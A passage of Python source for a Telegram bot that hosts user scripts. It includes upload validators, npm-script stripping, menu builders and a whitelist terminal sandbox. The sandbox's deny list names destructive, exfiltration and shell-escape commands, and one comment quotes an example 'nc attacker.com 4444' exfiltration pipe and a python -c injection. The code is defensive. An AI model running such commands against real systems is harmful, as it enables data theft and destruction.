                                         diff_snippet=diff_snippet)

def _validate_requirements_txt(path: str) -> bool:
    """
    SECURITY: Reject requirements.txt that contain:
      - URL-based installs  (http:// / https:// / git+)
      - Editable installs   (-e)
      - Recursive includes  (-r / --requirement)
      - Global pip flags    (--, --extra-index-url, etc.)
    These can all run arbitrary code at install time (setup.py / wheel hooks).
    """
    try:
        with open(path, 'r', encoding='utf-8', errors='ignore') as f:
            lines = f.readlines()
        for line in lines:
            line = line.strip()
            if not line or line.startswith('#'):
                continue
            lowered = line.lower()
            if any(lowered.startswith(x) for x in
                   ('-r', '-e', '--', 'http://', 'https://', 'git+', 'svn+', 'hg+', 'bzr+')):
                return False
            pkg_name = re.split(r'[><=!\[]', line)[0].strip()
            if not _SAFE_PKG_RE.match(pkg_name):
                return False
        return True
    except Exception:
        return False

def _strip_npm_lifecycle_scripts(pkg_json_path: str) -> None:
    """
    SECURITY: Remove preinstall/postinstall/install lifecycle scripts from
    package.json before running `npm install --ignore-scripts`.
    These hooks can execute arbitrary shell commands during npm install.
    """
    try:
        import json
        with open(pkg_json_path, 'r', encoding='utf-8') as f:
            data = json.load(f)
        scripts = data.get('scripts', {})
        for key in ('preinstall', 'install', 'postinstall', 'preuninstall',
                    'uninstall', 'postuninstall', 'prepare', 'prepublish'):
            scripts.pop(key, None)
        data['scripts'] = scripts
        with open(pkg_json_path, 'w', encoding='utf-8') as f:
            json.dump(data, f, indent=2)
    except Exception as e:
        logger.warning(f"_strip_npm_lifecycle_scripts: {e}")

def handle_zip_file(content, zip_name, message):
    user_id     = message.from_user.id
    user_folder = get_user_folder(user_id)
    temp_dir    = None
    try:
        # ── SECURITY: extract INSIDE the user's own sandbox folder, never
        # into the OS default temp location — that location depends on
        # ambient TMPDIR/TEMP/TMP env vars on the host process, which can
        # resolve outside the sandbox (e.g. straight into the VPS home dir).
        temp_dir = tempfile.mkdtemp(prefix=f".zip_{user_id}_", dir=user_folder)
        zip_path = os.path.join(temp_dir, zip_name)
        with open(zip_path, 'wb') as f:
            f.write(content)

        with zipfile.ZipFile(zip_path, 'r') as zf:
            # ── SECURITY: ZIP bomb protection ─────────────────────────────
            total_extracted = sum(i.file_size for i in zf.infolist())
            if total_extracted > MAX_ZIP_EXTRACTED_MB * 1024 * 1024:
                bot.reply_to(message,
                    f"❌ ZIP would extract to {total_extracted//1024//1024}MB — "
                    f"max is {MAX_ZIP_EXTRACTED_MB}MB.")
                return

            for member in zf.infolist():
                # ── SECURITY: Path traversal check (also rejects absolute
                # paths — os.path.join discards temp_dir if member.filename
                # is absolute, so the startswith check below catches both) ──
                if os.path.isabs(member.filename):
                    raise zipfile.BadZipFile(f"Unsafe absolute path: {member.filename}")
                member_path = os.path.abspath(os.path.join(temp_dir, member.filename))
                if not member_path.startswith(os.path.abspath(temp_dir) + os.sep) \
                   and member_path != os.path.abspath(temp_dir):
                    raise zipfile.BadZipFile(f"Unsafe path detected: {member.filename}")
            zf.extractall(temp_dir)

        items    = os.listdir(temp_dir)
        py_files = [f for f in items if f.endswith('.py')]
        js_files = [f for f in items if f.endswith('.js')]
        req_file = 'requirements.txt' if 'requirements.txt' in items else None
        pkg_json = 'package.json'     if 'package.json'     in items else None

        if req_file:
            # ── SECURITY: Validate requirements.txt before pip install ────
            req_path = os.path.join(temp_dir, req_file)
            if not _validate_requirements_txt(req_path):
                bot.reply_to(message,
                    "❌ <code>requirements.txt</code> contains unsafe entries "
                    "(URLs, git refs, editable installs, or -r includes are not allowed).",
                    parse_mode='HTML')
                return
            bot.reply_to(message, "📦 Installing Python dependencies…")
            try:
                pip_cmd = get_user_pip(user_id)
                subprocess.run(
                    pip_cmd + ['install', '--no-cache-dir', '-r', req_path],
                    capture_output=True, text=True, check=True, encoding='utf-8', errors='ignore'
                )
                bot.reply_to(message, "✅ Python deps installed.")
            except subprocess.CalledProcessError as e:
                bot.reply_to(message,
                    f"❌ Pip install failed:\n<pre>{_html.escape((e.stderr or e.stdout)[:1500])}</pre>",
                    parse_mode='HTML')
                return

        if pkg_json:
            # ── SECURITY: Strip npm lifecycle scripts before install ───────
            pkg_path = os.path.join(temp_dir, pkg_json)
            _strip_npm_lifecycle_scripts(pkg_path)
            bot.reply_to(message, "📦 Installing Node.js dependencies…")
            try:
                subprocess.run(['npm', 'install', '--ignore-scripts'], capture_output=True, text=True,
                               check=True, cwd=temp_dir, encoding='utf-8', errors='ignore')
                bot.reply_to(message, "✅ Node deps installed.")
            except FileNotFoundError:
                bot.reply_to(message, "❌ <code>npm</code> not found.", parse_mode='HTML')
                return
            except subprocess.CalledProcessError as e:
                bot.reply_to(message,
                    f"❌ NPM install failed:\n<pre>{(e.stderr or e.stdout)[:1500]}</pre>",
                    parse_mode='HTML')
                return

        main_script = file_type = None
        for name in ['main.py', 'bot.py', 'app.py']:
            if name in py_files:
                main_script = name; file_type = 'py'; break
        if not main_script:
            for name in ['index.js', 'main.js', 'bot.js', 'app.js']:
                if name in js_files:
                    main_script = name; file_type = 'js'; break
        if not main_script:
            if py_files:   main_script = py_files[0]; file_type = 'py'
            elif js_files: main_script = js_files[0]; file_type = 'js'
        if not main_script:
            bot.reply_to(message, "❌ No <code>.py</code> or <code>.js</code> file found in archive.", parse_mode='HTML')
            return

        for item in os.listdir(temp_dir):
            src = os.path.join(temp_dir, item)
            dst = os.path.join(user_folder, item)
            if os.path.isdir(dst):   shutil.rmtree(dst)
            elif os.path.exists(dst): os.remove(dst)
            shutil.move(src, dst)

        handle_single_file(
            os.path.join(user_folder, main_script),
            user_id, user_folder, main_script, file_type, message
        )

    except zipfile.BadZipFile as e:
        bot.reply_to(message, f"❌ Invalid ZIP file: {e}")
    except Exception as e:
        logger.error(f"handle_zip_file: {e}", exc_info=True)
        bot.reply_to(message, f"❌ Error processing ZIP: {e}")
    finally:
        if temp_dir and os.path.exists(temp_dir):
            try:
                shutil.rmtree(temp_dir)
            except Exception:
                pass

def _btn(label: str, color: str, callback_data: str) -> types.InlineKeyboardButton:
    return types.InlineKeyboardButton(label, callback_data=callback_data)

def _btn_url(label: str, color: str, url: str) -> types.InlineKeyboardButton:
    return types.InlineKeyboardButton(label, url=url)

def _build_welcome_text(user_id, user_name, user_username):
    limit    = get_user_file_limit(user_id)
    current  = get_user_file_count(user_id)
    lim_str  = "∞" if limit == float('inf') else str(limit)
    status   = _user_status_label(user_id)
    pending  = f"\n│ 🔔 Pending:  {get_pending_files_count()}" if user_id in admin_ids else ""

    return (
        f"╔══════════════════╗\n"
        f"║  🖥️ <b>SCRIPT HOST BOT</b>  ║\n"
        f"╚══════════════════╝\n\n"
        f"👋 Welcome, <b>{user_name}</b>!\n\n"
        f"┌──────────────────\n"
        f"│ 🆔 <code>{user_id}</code>\n"
        f"│ 🔗 @{user_username or 'not set'}\n"
        f"│ 🏅 {status}\n"
        f"│ 📁 Files: <code>{current}</code> / <code>{lim_str}</code>{pending}\n"
        f"└──────────────────\n\n"
        f"📤 Upload <code>.py</code> · <code>.js</code> · <code>.zip</code>\n"
        f"✅ Files are <b>auto-approved</b> — start running instantly!\n\n"
        f"💡 <b>Tip:</b> Use /terminal for live command execution!"
    )

def create_main_menu(user_id):
    pending_count = get_pending_files_count() if user_id in admin_ids else 0
    mk = types.InlineKeyboardMarkup()

    mk.row(
        _btn("📤 Upload",   "success", "upload"),
        _btn("📂 My Files", "primary", "check_files"),
    )
    mk.row(
        _btn("📂 My Dirs", "primary", "mydirs_view"),
    )
    mk.row(
        _btn("📊 Stats",  "primary", "stats"),
        _btn("⚡ Ping",   "warning", "speed"),
        _btn("⏱️ Uptime", "primary", "uptime"),
    )
    mk.row(
        _btn_url("📢 Updates", "primary", UPDATE_CHANNEL),
        _btn("🤝 Sisters",     "purple",  "sister_bots"),
    )
    mk.row(
        _btn_url("📞 Owner 1", "gray", f'https://t.me/{OWNER_USERNAMES[0].lstrip("@")}'),
        _btn_url("📞 Owner 2", "gray", f'https://t.me/{OWNER_USERNAMES[1].lstrip("@")}'),
    )
    mk.row(
        _btn("💻 Terminal",  "warning", "open_terminal"),
        _btn("📦 Pip Tools", "primary", "pip_menu"),
    )
    mk.row(
        _btn("💡 Suggest Upgrade", "purple", "suggest_upgrade"),
    )

    if user_id in admin_ids:
        mk.row(
            _btn("🔍 Verify Files",       "warning", "view_approved"),
            _btn("💳 Subscriptions",      "purple",  "subscription"),
        )
        mk.row(
            _btn("📣 Broadcast",          "success", "broadcast"),
            _btn("👑 Admin Panel",        "purple",  "admin_panel"),
        )
        lock_label = "🔓 Unlock Bot" if bot_locked else "🔒 Lock Bot"
        lock_cb    = "unlock_bot"    if bot_locked else "lock_bot"
        lock_color = "success"       if bot_locked else "danger"
        mk.row(
            _btn(lock_label,             lock_color, lock_cb),
            _btn("🚀 Run All Scripts",   "success",  "run_all_scripts"),
        )
        mk.row(
            _btn("📜 Running Log",  "primary", "running_log"),
            _btn("🗄️ Backup DB",   "primary", "backup_db"),
        )
        # ── Auto-Approve toggle always visible for admins in main menu ──
        aa_label = "✅ Auto-Approve: ON" if auto_approve_enabled else "❌ Auto-Approve: OFF"
        aa_color = "success"             if auto_approve_enabled else "danger"
        mk.row(
            _btn(aa_label, aa_color, "toggle_auto_approve"),
        )
    return mk

def create_reply_keyboard(user_id):
    mk = types.ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    buttons = [
        "📤 Upload File", "📂 Check Files",
        "📊 Statistics",  "⚡ Bot Speed",
        "🤝 Sister Bots", "🏠 Main Menu",
        "💻 Terminal",    "📦 Pip Tools",
    ]
    if user_id in admin_ids:
        buttons.append("👑 Admin Panel")
    mk.add(*[types.KeyboardButton(b) for b in buttons])
    return mk

def _approval_icon(status):
    return {
        FILE_STATUS_APPROVED: "✅",
        FILE_STATUS_PENDING:  "⏳",
        FILE_STATUS_REJECTED: "❌",
        FILE_STATUS_BANNED:   "🚫",
    }.get(status, "❓")

def _approval_label(status):
    return {
        FILE_STATUS_APPROVED: "✅ Approved",
        FILE_STATUS_PENDING:  "⏳ Pending",
        FILE_STATUS_REJECTED: "❌ Rejected",
        FILE_STATUS_BANNED:   "🚫 Banned",
    }.get(status, "❓ Unknown")

def create_file_controls(owner_id, file_name, is_running):
    fs = get_file_status(owner_id, file_name)
    mk = types.InlineKeyboardMarkup()

    if is_running:
        mk.row(
            _btn("🔴 Stop Script",  "danger",   _cb('stop_',    owner_id, file_name)),
            _btn("🔄 Restart",      "success",  _cb('restart_', owner_id, file_name)),
        )
    else:
        mk.row(
            _btn("▶️ Start Script ✨", "success", _cb('start_', owner_id, file_name)),
        )

    mk.row(
        _btn("📜 View Logs",   "primary", _cb('logs_',   owner_id, file_name)),
        _btn("🗑️ Delete File", "danger",  _cb('delete_', owner_id, file_name)),
    )
    mk.row(
        _btn("✏️ Rename", "warning", _cb('rename_', owner_id, file_name)),
    )

    status_color = {
        FILE_STATUS_APPROVED: "success",
        FILE_STATUS_PENDING:  "warning",
        FILE_STATUS_REJECTED: "danger",
        FILE_STATUS_BANNED:   "danger",
    }.get(fs['status'], "gray")
    mk.row(
        _btn(f"📋 {_approval_label(fs['status'])}", status_color, _cb('status_', owner_id, file_name)),
    )

    mk.row(
        _btn("📦 Install Pkg", "success", f"pip_install_{owner_id}"),
        _btn("📋 List Pkgs",   "primary", f"pip_show_{owner_id}"),
        _btn("💻 Terminal",    "warning", "open_terminal"),
    )

    wd_excluded = is_watchdog_excluded(owner_id, file_name)
    wd_btn_label = "🐕 Auto-Restart: OFF (tap to enable)" if wd_excluded else "🐕 Auto-Restart: ON (tap to disable)"
    wd_btn_color = "gray" if wd_excluded else "success"
    mk.row(
        _btn(wd_btn_label, wd_btn_color, _cb('wdtoggle_', owner_id, file_name)),
    )

    mk.row(
        _btn("🔙 Back to Files", "gray", "check_files"),
    )
    return mk

def create_pip_menu(user_id):
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("📦 Install Package",   "success", f"pip_install_{user_id}"),
        _btn("🗑️ Uninstall Package", "danger",  f"pip_uninstall_{user_id}"),
    )
    mk.row(
        _btn("📋 List All Packages", "primary", f"pip_show_{user_id}"),
        _btn("🔍 Search Package",    "primary", f"pip_search_{user_id}"),
    )
    mk.row(
        _btn("⬆️ Upgrade Package",  "success", f"pip_upgrade_{user_id}"),
        _btn("📄 Show Package Info", "primary", f"pip_info_{user_id}"),
    )
    mk.row(
        _btn("💻 Open Terminal", "warning", "open_terminal"),
    )
    mk.row(
        _btn("🩺 Check My Venv", "primary", f"checkvenv_{user_id}"),
        _btn("♻️ Reset My Venv",  "danger",  f"resetvenv_ask_{user_id}"),
    )
    mk.row(
        _btn("🔙 Back", "gray", "back_to_main"),
    )
    return mk

def create_terminal_menu():
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("📟 Processes",      "primary", "term_procs"),
    )
    mk.row(
        _btn("🔙 Back to Menu",   "gray",   "back_to_main"),
        _btn("❌ Close Terminal", "danger", "close_terminal"),
    )
    return mk

def _terminal_running_markup(proc_id: str):
    """Markup shown while a terminal-launched process is actively running."""
    mk = types.InlineKeyboardMarkup()
    mk.row(_btn("🛑 Stop Process", "danger", f"term_kill_{proc_id}"))
    mk.row(
        _btn("📟 Processes",      "primary", "term_procs"),
        _btn("❌ Close Terminal", "danger", "close_terminal"),
    )
    return mk

def create_admin_panel_markup():
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("➕ Add Admin",    "success", "add_admin"),
        _btn("➖ Remove Admin", "danger",  "remove_admin"),
    )
    mk.row(
        _btn("📋 List Admins",   "primary", "list_admins"),
        _btn("🔍 Verify Files",  "warning", "view_approved"),
    )
    mk.row(
        _btn("📜 Running Log", "primary", "running_log"),
        _btn("🔔 Pending",     "warning", "view_pending"),
    )
    # ── Upgrade 1 & 5: Scan Rules + Quarantine ──
    banned_count = len(get_all_banned_files())
    mk.row(
        _btn("🔧 Scan Rules",               "primary", "scan_rules"),
        _btn(f"🔒 Quarantine ({banned_count})", "danger",  "quarantine"),
    )
    auto_label = "✅ Auto-Approve: ON" if auto_approve_enabled else "❌ Auto-Approve: OFF"
    dmsg_label = "💬 Daily Msgs: ON"  if daily_msg_enabled   else "💬 Daily Msgs: OFF"
    mk.row(
        _btn(auto_label, "warning", "toggle_auto_approve"),
        _btn(dmsg_label, "primary", "toggle_daily_msg"),
    )
    mk.row(
        _btn("🖼️ Photo Broadcast", "success", "broadcast_photo"),
        _btn("📝 Text Broadcast",  "primary", "broadcast_text"),
    )
    # ── Backup & Recovery row ──
    bk_ts = _last_backup_time.strftime('%H:%M') if _last_backup_time else "never"
    hb_label = "⏰ Auto-Backup: ON" if hourly_backup_enabled else "⏰ Auto-Backup: OFF"
    mk.row(
        _btn(f"📤 Send Backup Now", "primary", "manual_backup"),
        _btn("🔁 Recovery Mode",   "danger",  "recovery_mode"),
    )
    mk.row(
        _btn(hb_label, "warning" if hourly_backup_enabled else "gray", "toggle_hourly_backup"),
        _btn(f"🕐 Last Backup: {bk_ts}", "gray", "backup_info"),
    )
    # ── Watchdog control (owner starts/stops manually, never auto-starts) ──
    wd_label = "🐕 Watchdog: ON (tap to stop)" if watchdog_running else "🐕 Watchdog: OFF (tap to start)"
    wd_color = "success" if watchdog_running else "danger"
    mk.row(
        _btn(wd_label, wd_color, "toggle_watchdog"),
        _btn("ℹ️ Watchdog Info", "gray", "watchdog_info"),
    )
    mk.row(
        _btn("♻️ Reset ALL User Venvs", "danger", "resetallvenv_ask"),
    )
    mk.row(
        _btn("📝 Audit Log", "primary", "view_audit_log"),
        _btn("🕰️ Idle Venvs", "warning", "idle_venvs"),
    )
    mk.row(
        _btn("🔙 Back", "gray", "back_to_main"),
    )
    return mk

def create_subscription_menu():
    mk = types.InlineKeyboardMarkup()
    mk.row(
        _btn("➕ Add Sub",    "success", "add_subscription"),
        _btn("➖ Remove Sub", "danger",  "remove_subscription"),
    )
    mk.row(
        _btn("🔍 Check Sub", "primary", "check_subscription"),
    )
    mk.row(
        _btn("🔙 Back", "gray", "back_to_main"),
    )
    return mk

def _get_running_scripts_info():
    results = []
    for key, info in list(bot_scripts.items()):
        uid   = info.get('script_owner_id')
        fname = info.get('file_name', '?')
        if not is_bot_running(uid, fname):
            continue
        proc = info.get('process')
        pid  = proc.pid if proc else '?'
        start_time = info.get('start_time')
        if start_time:
            delta = datetime.now() - start_time
            h, rem = divmod(int(delta.total_seconds()), 3600)
            m, s   = divmod(rem, 60)
            uptime = f"{h}h {m}m {s}s"
        else:
            uptime = '?'
        ftype = info.get('type', '?').upper()

        cpu_pct, mem_mb = '?', '?'
        try:
            if proc:
                ps_proc = psutil.Process(proc.pid)
                cpu_pct = f"{ps_proc.cpu_percent(interval=0.1):.1f}%"
                mem_mb  = f"{ps_proc.memory_info().rss / (1024*1024):.1f}MB"
        except Exception:
            pass

        results.append({
            'uid': uid, 'fname': fname,
            'pid': pid, 'uptime': uptime, 'ftype': ftype,
            'cpu': cpu_pct, 'mem': mem_mb,
        })
    return results

def _send_running_log(chat_id):
    running = _get_running_scripts_info()
    if not running:
        mk = types.InlineKeyboardMarkup()
        mk.add(_btn("🔄 Refresh", "primary", "running_log"))
        mk.add(_btn("🔙 Back",    "gray",    "back_to_main"))
        bot.send_message(chat_id, "📜 <b>Running Scripts Log</b>\n\n⚫ No scripts currently running.", reply_markup=mk, parse_mode='HTML')
        return

    lines = [f"📜 <b>Running Scripts — {len(running)} active</b>\n"]
    mk    = types.InlineKeyboardMarkup(row_width=1)
    for i, r in enumerate(running, 1):
        lines.append(
            f"{i}. 👤 <code>{r['uid']}</code>  📄 <code>{r['fname']}</code> [{r['ftype']}]\n"
            f"   🔢 PID: <code>{r['pid']}</code>  ⏱️ Up: <code>{r['uptime']}</code>\n"
            f"   🧠 CPU: <code>{r['cpu']}</code>  🗂️ RAM: <code>{r['mem']}</code>"
        )
        mk.add(types.InlineKeyboardButton(
            f"🔴 Stop: {r['fname']} (uid:{r['uid']})",
            callback_data=_cb('stop_', r['uid'], r['fname'])
        ))

    mk.row(
        _btn("🔄 Refresh", "primary", "running_log"),
        _btn("🔙 Back",    "gray",    "back_to_main"),
    )
    text = "\n".join(lines)
    if len(text) > 4000:
        text = text[:3900] + "\n…(truncated)"
    bot.send_message(chat_id, text, reply_markup=mk, parse_mode='HTML')

# ── TERMINAL ENGINE — WHITELIST-ONLY SANDBOX ─────────────────────────────
# Only explicitly allowed commands run. Everything else is blocked by default.

_TERMINAL_MAX_OUTPUT = 3500
_TERMINAL_CMD_TIMEOUT = 30

# ── Allowed command whitelist ─────────────────────────────────────────────
# Format: base_command -> allowed flags/subcommands pattern (None = no args allowed beyond safe ones)
_ALLOWED_CMDS = {
    # Python
    'python':    re.compile(r'^python[0-9.]?\s+\S.*$',           re.I),
    'python3':   re.compile(r'^python3[0-9.]?\s+\S.*$',          re.I),
    # Node / npm
    'node':      re.compile(r'^node\s+\S.*$',                    re.I),
    'npm':       re.compile(r'^npm\s+(install|uninstall|list|run|start|ci)(\s.*)?$', re.I),
    'npx':       re.compile(r'^npx\s+\S.*$',                     re.I),
    # pip
    'pip':       re.compile(r'^pip[0-9.]?\s+(install|uninstall|list|show|freeze|check)(\s.*)?$', re.I),
    'pip3':      re.compile(r'^pip[0-9.]?\s+(install|uninstall|list|show|freeze|check)(\s.*)?$', re.I),
    # safe file reading
    'cat':       re.compile(r'^cat\s+[^/;|&`$<>\\]+$'),
    'head':      re.compile(r'^head(\s+-n\s*\d+)?\s+[^/;|&`$<>\\]+$'),
    'tail':      re.compile(r'^tail(\s+-n\s*\d+)?\s+[^/;|&`$<>\\]+$'),
    'ls':        re.compile(r'^ls(\s+-[alh]+)?(\s+[^/;|&`$<>\\]*)?$'),
    'pwd':       re.compile(r'^pwd$'),
    'echo':      re.compile(r'^echo\s+[^;|&`$<>\\]+$'),
    'wc':        re.compile(r'^wc(\s+-[lwc]+)?\s+[^/;|&`$<>\\]+$'),
    'grep':      re.compile(r'^grep(\s+-[a-zA-Z]+)?\s+\S+\s+[^/;|&`$<>\\]+$'),
    'find':      re.compile(r'^find\s+\.\s+.*$'),
    # ── File CREATION (sandboxed — path check enforced in _run_terminal_command) ──
    'mkdir':     re.compile(r'^mkdir(\s+-p)?\s+[A-Za-z0-9_./ -]+$'),
    'touch':     re.compile(r'^touch\s+[A-Za-z0-9_.\-]+(\s+[A-Za-z0-9_.\-]+)*$'),
    # env / system info (read-only)
    'env':       re.compile(r'^env$'),
    'printenv':  re.compile(r'^printenv(\s+\w+)?$'),
    'uname':     re.compile(r'^uname(\s+-[a-zA-Z]+)?$'),
    'date':      re.compile(r'^date$'),
    'uptime':    re.compile(r'^uptime$'),
    'df':        re.compile(r'^df(\s+-h)?(\s+\.)?$'),
    'du':        re.compile(r'^du(\s+-[shmk]+)?(\s+\.)?$'),
    'free':      re.compile(r'^free(\s+-h)?$'),
    'ps':        re.compile(r'^ps(\s+aux|\s+u|\s+-u\s+\w+)?$'),
    'which':     re.compile(r'^which\s+\w+$'),
    'whoami':    re.compile(r'^whoami$'),
    # cd — sandboxed directory navigation (handled specially, never exec'd)
    'cd':        re.compile(r'^cd(\s+[A-Za-z0-9_./ -]+)?$'),
}

# ── Absolute block list — these can NEVER run, even for admins in sandbox ─
_TERMINAL_NEVER = re.compile(
    r'(^|[;&|`\n\r])(\s*)('

    # ── 1. FILESYSTEM DESTRUCTION (rm -rf, find -delete, etc.) ───────────
    r'rm\b|rmdir\b|shred\b|wipe\b|'
    r'find\b|'           # covers "find / -type f -delete" and similar

    # ── 2. DISK OVERWRITE (dd, fallocate, etc.) ───────────────────────────
    r'dd\b|'
    r'fallocate\b|'      # fallocate -l 100G fills disk instantly
    r'truncate\b|'       # truncate can zero/grow files

    # ── 3. DISK FORMATTING ────────────────────────────────────────────────
    r'mkfs\b|mkfs\.\w+\b|'   # mkfs, mkfs.ext4, mkfs.xfs etc.
    r'fdisk\b|parted\b|gdisk\b|cfdisk\b|'

    # ── 4. MEMORY EXHAUSTION helpers ─────────────────────────────────────
    # python3 -c is already blocked; "yes" and infinite shell loops
    r'yes\b|'            # yes > /dev/null → 100% CPU

    # ── 5. FORK BOMB / PROCESS FLOODS ────────────────────────────────────
    # :(){ :|:& };: — shell function syntax, caught by shell escape block below
    # Also block: nohup, disown, bg, fg that could detach bomb processes
    r'nohup\b|disown\b|'

    # ── 6. KILLING PROCESSES ──────────────────────────────────────────────
    r'kill\b|killall\b|pkill\b|pgrep\b|'
    r'strace\b|ltrace\b|gdb\b|'

    # ── 7. PERMISSION / OWNERSHIP CHANGES ────────────────────────────────
    r'chmod\b|chown\b|chgrp\b|chattr\b|lsattr\b|'
    r'setfacl\b|getfacl\b|'

    # ── 8. USER / AUTH MANIPULATION ──────────────────────────────────────
    r'useradd\b|userdel\b|usermod\b|groupadd\b|groupdel\b|'
    r'passwd\b|chpasswd\b|visudo\b|'

    # ── 9. FIREWALL / NETWORK CONFIG ─────────────────────────────────────
    r'iptables\b|ip6tables\b|ufw\b|nft\b|firewall-cmd\b|'
    r'ifconfig\b|iwconfig\b|'
    r'ip\b|'             # "ip link set eth0 down" etc.
    r'route\b|'          # route del default
    r'tc\b|'             # traffic control

    # ── 10. NETWORK RECON / EXFIL ────────────────────────────────────────
    r'curl\b|wget\b|nc\b|ncat\b|netcat\b|nmap\b|masscan\b|'
    r'ssh\b|scp\b|sftp\b|ftp\b|telnet\b|rsync\b|rcp\b|'
    r'dig\b|nslookup\b|whois\b|traceroute\b|tracepath\b|mtr\b|'
    r'arp\b|netstat\b|ss\b|lsof\b|'
    r'tcpdump\b|wireshark\b|tshark\b|'

    # ── 11. SYSTEM FINGERPRINTING / INFO RECON ────────────────────────────
    r'neofetch\b|screenfetch\b|inxi\b|lshw\b|lscpu\b|lspci\b|lsusb\b|'
    r'dmidecode\b|hwinfo\b|'
    r'history\b|last\b|lastlog\b|who\b|'
    r'dmesg\b|'

    # ── 12. SHELL ESCAPE / CODE EXEC ─────────────────────────────────────
    r'bash\b|sh\b|zsh\b|fish\b|dash\b|ksh\b|csh\b|tcsh\b|'
    r'exec\b|eval\b|source\b|\.\s+\S|'
    r'python[23]?\s+-c\b|node\s+-e\b|'   # inline code exec
    r'xargs\b|'          # xargs can chain dangerous commands

    # ── 13. EDITORS (can drop to shell) ──────────────────────────────────
    r'nano\b|vim\b|vi\b|emacs\b|pico\b|joe\b|ed\b|ex\b|micro\b|'

    # ── 14. SYSTEM CONTROL ───────────────────────────────────────────────
    r'shutdown\b|reboot\b|halt\b|poweroff\b|init\b|telinit\b|'
    r'systemctl\b|service\b|journalctl\b|'
    r'sysctl\b|'         # can tune kernel params (memory overcommit etc.)

    # ── 15. PRIVILEGE ESCALATION ─────────────────────────────────────────
    r'sudo\b|su\b|doas\b|pkexec\b|newgrp\b|'

    # ── 16. COMPILERS / ALT INTERPRETERS (can spawn shells) ──────────────
    r'gcc\b|g\+\+\b|clang\b|make\b|cmake\b|'
    r'cargo\b|rustc\b|go\b|ruby\b|perl\b|lua\b|php\b|'
    r'java\b|javac\b|kotlinc\b|dotnet\b|mono\b|'
    r'tclsh\b|wish\b|awk\b|gawk\b|mawk\b|'   # awk can run arbitrary code
    r'sed\b|'            # sed -e can exec with some builds

    # ── 17. PACKAGE MANAGERS (run install scripts) ────────────────────────
    r'apt\b|apt-get\b|apt-cache\b|dpkg\b|'
    r'yum\b|dnf\b|rpm\b|'
    r'pacman\b|yay\b|paru\b|'
    r'brew\b|snap\b|flatpak\b|'

    # ── 18. ARCHIVING / ENCODING (exfil staging) ─────────────────────────
    r'tar\b|zip\b|unzip\b|gzip\b|gunzip\b|bzip2\b|bunzip2\b|xz\b|7z\b|'
    r'base64\b|xxd\b|od\b|hexdump\b|'

    # ── 19. DISK / MOUNT OPS ─────────────────────────────────────────────
    r'mount\b|umount\b|losetup\b|'
    r'blkid\b|lsblk\b|'

    # ── 20. CRON / SCHEDULING (persistence) ──────────────────────────────
    r'crontab\b|at\b|batch\b|'
    r'systemd-run\b|'

    # ── 21. MISC DANGEROUS UTILS ─────────────────────────────────────────
    r'mv\b|cp\b|'                            # file move/copy
    r'tee\b|mkfifo\b|mknod\b|ln\b|'
    r'touch\b|'                              # file creation
    r'write\b|wall\b|sendmail\b|mail\b|'    # messaging/sending
    r'env\s+-i\b|'                           # env -i clears env to sneak cmds
    r'timeout\b|'                            # timeout cmd — wraps any blocked cmd
    r'watch\b|'                              # watch -n0 cmd — repeats any cmd
    r'screen\b|tmux\b|byobu\b|'             # terminal multiplexers = shell escape
    r'script\b|'                             # script cmd records terminal
    r'expect\b|'                             # expect can automate interactive cmds
    r'socat\b|'                              # like netcat but more powerful
    r'python[23]?\s+-m\s+http\.server|'     # spin up HTTP server for exfil
    r'python[23]?\s+-m\s+SimpleHTTPServer'  # python2 http server
    r')',
    re.IGNORECASE
)

# ── Secondary pattern: catch /dev/... writes which bypass command names ───
_TERMINAL_DEV_WRITE = re.compile(
    r'(>|>>)\s*/dev/(sd[a-z]|vd[a-z]|nvme|hd[a-z]|xvd|zero|urandom|mem|kmem)',
    re.IGNORECASE
)

# ── Block Python/Node one-liners that do resource exhaustion ─────────────
_TERMINAL_RESOURCE_BOMB = re.compile(
    r'while\s+(True|1|\:)\s*:\s*(a\s*\.|pass|\w)',   # python infinite loop
    re.IGNORECASE
)

# Shell metacharacter injection guard (applies after whitelist check too)
_SHELL_INJECT = re.compile(r'[;&|`$\(\)\{\}\\<>\n\r]')

def _terminal_check(cmd: str, user_id: int) -> tuple[bool, str]:
    """
    Returns (allowed: bool, reason: str).
    Full whitelist approach — if not explicitly allowed, blocked.
    """
    stripped = cmd.strip()

    # 1. Empty
    if not stripped:
        return False, "Empty command."

    # 2. Length cap
    if len(stripped) > 300:
        return False, "Command too long (max 300 chars)."

    # 3. Hard-never list — checked first, even before whitelist
    if _TERMINAL_NEVER.search(stripped):
        m = _TERMINAL_NEVER.search(stripped)
        blocked_cmd = m.group(3).strip() if m else "unknown"
        return False, f"🚫 <code>{_esc(blocked_cmd)}</code> is permanently blocked for server security."

    # 3b. Block direct /dev/ writes (dd if=/dev/zero of=/dev/sda etc.)
    if _TERMINAL_DEV_WRITE.search(stripped):
        return False, "🚫 Writing to <code>/dev/</code> block devices is permanently blocked."

    # 3c. Block obvious resource-bomb patterns in arguments
    if _TERMINAL_RESOURCE_BOMB.search(stripped):
        return False, "🚫 Infinite loop / resource exhaustion pattern detected and blocked."

    # 4. Extract base command for later whitelist lookup
    base = stripped.split()[0].lower().lstrip('./')

    # ── SECURITY: No command gets a shell-metachar exemption.
    # Previously python/node/grep were exempted, allowing:
    #   grep pattern / | nc attacker.com 4444   ← data exfil
    #   python3 -c "import os; os.system('...')"  ← code injection
    # Now ALL commands must pass the metacharacter filter (no exceptions).
    if _SHELL_INJECT.search(stripped):
        return False, "🚫 Shell metacharacters (<code>; | &amp; ` $ ( ) { } \\ &lt; &gt;</code>) are not allowed in any command."

    # 5. Whitelist check
    for allowed_base, pattern in _ALLOWED_CMDS.items():
        if base == allowed_base or stripped.startswith(allowed_base + ' ') or stripped == allowed_base:
            if pattern.match(stripped):
                # 6. Path sandbox — no absolute paths outside user folder
                user_folder = get_user_folder(user_id)
                abs_re = re.compile(r'(?<!\w)((?:/[a-zA-Z0-9_.%-]+)+)')
                for pm in abs_re.finditer(stripped):
                    p = pm.group(1)
                    safe_abs = ('/dev/null', '/usr/bin/', '/usr/local/', '/bin/', '/lib')
                    if any(p.startswith(s) for s in safe_abs):
                        continue
                    norm = os.path.normpath(p)
                    if not norm.startswith(os.path.abspath(user_folder)):
                        return False, f"🚫 Absolute path <code>{_esc(p)}</code> is outside your sandbox."
                return True, ""
            else:
                return False, (
                    f"🚫 <code>{_esc(base)}</code> — subcommand or flags not allowed.\n"
